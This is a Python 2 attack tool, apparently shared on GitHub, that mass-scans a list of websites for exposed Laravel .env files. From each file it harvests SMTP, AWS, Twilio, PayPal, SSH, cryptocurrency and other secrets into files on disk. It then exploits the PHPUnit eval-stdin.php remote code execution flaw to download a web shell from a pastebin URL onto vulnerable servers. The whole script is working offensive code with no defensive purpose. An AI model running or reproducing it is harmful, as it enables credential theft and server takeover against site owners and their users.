#!/usr/bin/python
# -----
# https://github.com/pashayogi
# Disclaimer: https://instagram.com/pranata_pasha
# -----
import re, requests, os, time, base64
from urlparse import urlparse as parse
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
Thread_ = 20 #Thread
Timeout_= 15
tmp_site = []
array = {
 'smtp':{
   'save' : 'smtp.txt',
   'regex': ['MAIL_HOST=','MAIL_PORT=','MAIL_USERNAME=','MAIL_PASSWORD=','MAIL_ENCRYPTION=']
 },
 'twilio' : {
   'save' : 'twilio.txt',
   'regex': ['TWILIO_ACCOUNT_SID','TWILIO_API_KEY','TWILIO_API_SECRET','TWILIO_CHAT_SERVICE_SID','TWILIO_AUTH_TOKEN','TWILIO_NUMBER']
 },
 'btc' : {
   'save' : 'btc.txt',
   'regex': ['BLOCKCHAIN_API=','DEFAULT_BTC_FEE=','TRANSACTION_BTC_FEE=']
 },
 'perfectmoney' : {
   'save' : 'pm.txt',
   'regex': ['PM_ACCOUNTID=','PM_PASSPHRASE=','PM_CURRENT_ACCOUNT=','PM_MARCHANTID=','PM_MARCHANT_NAME=','PM_UNITS=','PM_ALT_PASSPHRASE=']
 },
 'aws' : {
   'save' : 'aws.txt',
   'regex': ['AWS_ACCESS_KEY','AWS_SECRET','AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_S3_KEY','AWS_BUCKET','AWS_SES_KEY','AWS_SES_SECRET','SES_KEY','SES_SECRET','AWS_REGION','AWS_DEFAULT_REGION','SES_USERNAME','SES_PASSWORD']
 },
 'ssh' : {
   'save' : 'ssh.txt',
   'regex' : ['SSH_HOST','SSH_USERNAME','SSH_PASSWORD']
 },
 'plivo' : {
   'save' : 'plivo.txt',
   'regex': ['PLIVO_AUTH_ID','PLIVO_AUTH_TOKEN']
 },
 'nexmo' : {
   'save' : 'nexmo.txt',
   'regex': ['NEXMO_KEY','NEXMO_SECRET','NEXMO_NUMBER']
 },
 'paypal' : {
   'save' : 'paypal.txt',
   'regex': ['PAYPAL_CLIENT_ID','PAYPAL_SECRET','PAYPAL_MODE']
 },
 'ssh' : {
   'save' : 'ssh.txt',
   'regex': ['SSH_HOST','SSH_USERNAME','SSH_PASSWORD']
 },
 'razorpay' : {
   'save' : 'razorpay.txt',
   'regex': ['RAZORPAY_KEY','RAZORPAY_SECRET']
 }
}
class c:
    purple = '\033[95m'
    blue = '\033[94m'
    cyan = '\033[96m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    u = '\033[4m'
def banner():
   return base64.decodestring('X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgIDNLb20gU3VwZXJIYWNrIElJIExvZ29uICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnxfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX198CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgIFVzZXIgTmFtZTogICAgICAgICAgWyAgcm9vdEBleHBsb2l0ICBdICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgIFBhc3N3b3JkOiAgICAgICAgICAgWyAgZXhwb2l0QHJvb3QgIF0gICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsgT0sgXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnxfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX198CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8CnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZSA6IE1SLks3QzhORyAgICAgICB8CnxfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX198CnsgTGFyYXZlbCBFbnZpcm9ubWVudCBTY2FubmVyICsgUEhQVW5pdCBSY2UgfQ==')
   '''
 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [  root@exploit  ]                       |
|                                                                              |
|                 Password:           [  expoit@root  ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       code : MR.K7C8NG       |
|______________________________________________________________________________|
{ Laravel Environment Scanner + PHPUnit Rce }
'''
def not_vuln(u):print c.blue+'['+c.u+c.red+'Not Vuln!'+c.blue+']'+c.end+' '+c.yellow+u+c.end
def vulns(u):print c.blue+'['+c.green+'Vuln!'+c.blue+']'+c.end+' '+c.yellow+u+c.end
def inf(u,s):print c.blue+'['+c.u+c.cyan+s+c.blue+']'+c.end+' '+c.yellow+u+c.end
def except_error(E):
  if E:print c.red+"[Ex Error!!] %s" % (E)+c.end
  else:print c.red+"[Ex Error!!]"+c.end
def end_time(start_time):return re.sub('\.(.+?)?$','',"%s seconds" % (time.time() - start_time))+'s'
def exploit(site):
 start_time = time.time()
 try:
   path  = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
   data1 = '<?php phpinfo(); ?>' # for check Vuln Or No
   data2 = "<?php copy('https://pastebin.com/raw/ahW3kkUx','z7.php');readfile('z7.php'); ?>" # for upload shell
   url = site+path
   sou = requests.get(url, data=data1, timeout=Timeout_) # send a request to check whether vuln or not
   #print sou.text.replace('\n','')
   if re.search('phpinfo\(\)',sou.text):
      vuln = True
      req = requests.get(url, data=data2, timeout=Timeout_) # try uploading a shell
      if re.search('#sess#ok#', req.text):shell_upload = True;save('shells.txt',site+path.replace('eval-stdin.php','z7.php'))
      else:shell_upload = False
   else:
      vuln = False
   if vuln:
      if shell_upload:vulns(site+path.replace('eval-stdin.php','z7.php'))
      else:not_vuln(site)
   else:
      not_vuln(site)
 except: #ValueError as vve:
   #print vve
   except_error(site)
#exploit('http://support.honestinsite.com/api/')
def pausi(t,x):
 start_time = time.time()
 if x:
  tmp = []
  for z in array:
    #print array[z]['save']
    try:
     sv = []
     i = 0
     for s in reversed(array[z]['regex']):
       ss = re.findall(s+'(.+?)\n',x)
       if ss:
         #print array[z]['regex'][i] + ss[0]
         if ss and ss[0]:sv.append(array[z]['regex'][::-1][i] + ss[0])
         else:pass
         try:
           tm = array[z]['save'].replace('.txt','')
           if tm in tmp:pass
           else:tmp.append(tm)
         except:
           pass
       i = i+1
     try:
      if sv:save(array[z]['save'],'\n'.join(sv[::-1])+'\n')
     except:
      pass
    except:
     pass
  if tmp:tt = '['+','.join(tmp)+']'
  else : tt = ''
  #print '[%s]%s' % (tt,urlparse.urlparse(t).netloc)
  #print 'inf'
  inf(t, tt)
def save(a,b):
  x = open('results/'+a,'a')
  x.write(b+'\n')
  x.close
def go(x):
 start_time = time.time()
 try:
  if x in tmp_site:
    print '>> '+x+ ' {Duplicate URL}'
  elif x:
   tmp_site.append(x)
   if re.search('http(s)?://',x):pass
   else:x = 'http://'+x
   x = parse(x).scheme+'://'+parse(x).netloc+'/'
   xs = x
   if re.search('.env',x):pass
   else:x = x+'/.env'
   d = requests.get(x, verify=True)
   st = d.status_code
   try:
    if st == 200:
      s = d.text
      pausi(x,s)
    else:
     print c.end+x+' Error! '+ str(st)
    exploit(xs) #Try For Uplaod Shell
   except requests.exceptions.ConnectionError:
    print c.red+"Error Connection %s" % (x)
   except: # ValueError as ere:
    except_error(x) ##print x + ' error' #+ str(st)
   #prin/t ve
 except: #ValueError as se:
  print x + ' error#' # + se
def main():
    if not os.path.exists('results'):
       os.makedirs('results')
    a = open(raw_input('Your List-> '),'r').read().split()
    Thread_ = raw_input('Theread-> ')
    if a:
        pool = ThreadPool(int(Thread_))
        pool.map(go, a)
	pool.close()
        pool.join()
        #xsec(f[0])

if __name__ == '__main__':
 """
 Coded by Pausi/Zeerx7
 14/11/2020
 """
 print banner()
 try: main()
 except: print 'Error!'
